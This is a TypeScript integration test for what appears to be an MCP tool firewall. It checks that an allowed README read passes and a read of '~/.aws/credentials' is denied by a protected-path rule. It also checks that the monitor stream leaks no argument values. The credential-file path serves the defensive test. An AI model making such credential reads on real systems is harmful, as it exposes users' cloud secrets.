/** Reads the SSE stream until the monitor's `ready` marker, then disconnects. */
async function readSseBacklog(url: string): Promise<{ event: string; data: unknown }[]> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 5_000);
  try {
    const response = await fetch(url, { signal: controller.signal });
    const reader = response.body!.getReader();
    const decoder = new TextDecoder();
    let raw = '';
    while (!/event: ready\n/.test(raw)) {
      const { value, done } = await reader.read();
      if (done) break;
      raw += decoder.decode(value, { stream: true });
    }
    controller.abort();
    return raw
      .split('\n\n')
      .map((block) => {
        const event = /^event: (.*)$/m.exec(block)?.[1];
        const data = /^data: (.*)$/m.exec(block)?.[1];
        return event && data ? { event, data: JSON.parse(data) as unknown } : undefined;
      })
      .filter((e): e is { event: string; data: unknown } => e !== undefined);
  } finally {
    clearTimeout(timer);
  }
}

describe('proxy / vertical slice: CLI → monitor SSE', () => {
  let dir: string;
  let monitorUrl: string;
  let agent: Client;
  let stderr = '';

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-firewall-slice-'));
    const port = await freePort();
    monitorUrl = `http://127.0.0.1:${port}`;
    const configPath = join(dir, 'firewall.yaml');
    const config = {
      server: {
        id: 'demo',
        command: process.execPath,
        args: ['--import', 'tsx', resolve(repoRoot, 'demo/mock-server.ts')],
        cwd: repoRoot,
        timeoutMs: 10_000,
      },
      monitor: { enabled: true, host: '127.0.0.1', port, maxEvents: 100 },
      policy: loadConfig(resolve(repoRoot, 'config/firewall.yaml')).policy,
    };
    writeFileSync(configPath, JSON.stringify(config, null, 2));
    const transport = new StdioClientTransport({
      command: process.execPath,
      args: ['--import', 'tsx', resolve(repoRoot, 'src/index.ts'), '--config', configPath],
      cwd: repoRoot,
      stderr: 'pipe',
    });
    transport.stderr?.on('data', (chunk: Buffer) => (stderr += chunk.toString()));
    agent = new Client({ name: 'slice-agent', version: '0.0.0' });
    await agent.connect(transport);
  });

  afterAll(async () => {
    await agent?.close().catch(() => {});
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  it('GET /events replays exactly the allowed and the denied call, with no argument values', async () => {
    expect(stderr).toContain(`[firewall] monitor listening on ${monitorUrl}`);
    const health = (await (await fetch(`${monitorUrl}/health`)).json()) as { status: string; protectedServers: number };
    expect(health).toEqual({ status: 'ok', protectedServers: 1 });

    const allowed = (await agent.callTool({ name: 'read_project_file', arguments: { path: 'README.md' } })) as CallToolResult;
    const denied = (await agent.callTool({
      name: 'read_sensitive_file',
      arguments: { path: '~/.aws/credentials', note: ARG_SECRET },
    })) as CallToolResult;
    expect(allowed.isError).toBeFalsy();
    expect(textOf(denied).startsWith(BLOCKED_PREFIX)).toBe(true);

    const sse = await readSseBacklog(`${monitorUrl}/events`);
    const events = sse.filter((e) => e.event === 'firewall').map((e) => e.data as FirewallEvent);
    expect(events.map((e) => [e.toolName, e.decision, e.ruleId])).toEqual([
      ['read_project_file', 'ALLOW', 'APPROVED_TOOL'],
      ['read_sensitive_file', 'DENY', 'PROTECTED_PATH'],
    ]);
    expect(events[1]?.requestId).toBe(metaOf(denied)?.requestId);
    for (const e of events) expect(FirewallEventSchema.safeParse(e).success).toBe(true);
    expect(sse.find((e) => e.event === 'counts')?.data).toEqual({ inspected: 2, allowed: 1, denied: 1 });

    // T11: nothing from the arguments or the mock's secret reaches the stream.
    const raw = JSON.stringify(sse);
    for (const value of ['README.md', 'credentials', ARG_SECRET, MOCK_DUMMY_SECRET]) expect(raw).not.toContain(value);
  });
});
